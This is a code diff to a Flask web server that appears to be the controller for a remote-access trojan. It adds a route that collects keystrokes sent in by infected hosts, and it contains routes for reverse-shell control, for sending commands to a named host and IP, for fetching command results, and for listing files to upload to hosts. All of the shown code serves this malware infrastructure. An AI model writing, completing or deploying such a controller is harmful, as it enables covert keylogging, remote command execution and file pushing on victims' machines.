@@ -67,6 +67,17 @@ def pong():
 
   return 'Pong sent.', 200
 
+@app.route('/log', methods = ['POST'])
+def log_post():
+  global hosts
+  
+  # this is where the host can send it's keylog data
+  key = (request.remote_addr, request.form['name'])
+  hosts[key]['log'].append(request.form['key'])
+
+  return 'Ok', 200
+
+
 
 #interface routes
 @app.route('/')
@@ -116,8 +127,8 @@ def send_process():
   ip = request.form['ip']
   command = request.form['command'] 
   if not send_command(name, ip, command):
-    return "Ok", 200
-  return "Command failed!", 200
+    return "0", 200
+  return "1", 200
 
 # the route for reverse shell contorl
 @app.route('/shell', methods = ['GET', 'POST'])
@@ -154,7 +165,7 @@ def get_result():
   
   # this is where the web browser will call for the command result
   key = (request.remote_addr, request.form['name'])
-  return ''.join(hosts[key]['command_result'])
+  return hosts[key]['command_result']
 
 
 # the route for keylogger control
@@ -176,16 +187,18 @@ def getLog():
   
   return "Method not allowed", 403
 
-
-@app.route('/log', methods = ['POST'])
-def log_post():
+#route to the file uploading interface
+@app.route('/upload', methods = ['GET'])
+def upload():
   global hosts
-  
-  # this is where the host can send it's keylog data
-  key = (request.remote_addr, request.form['name'])
-  hosts[key]['log'].append(request.form['key'])
+  name = request.args.get('name')
+  ip = request.args.get('ip')
 
-  return 'Ok', 200
+  #get the files available for upload
+  file_list = os.listdir("./resources")
+
+  return render_template('upload.html', name = name, ip = ip, files = file_list)
+
 
 # https server
 # if __name__ == '__main__':
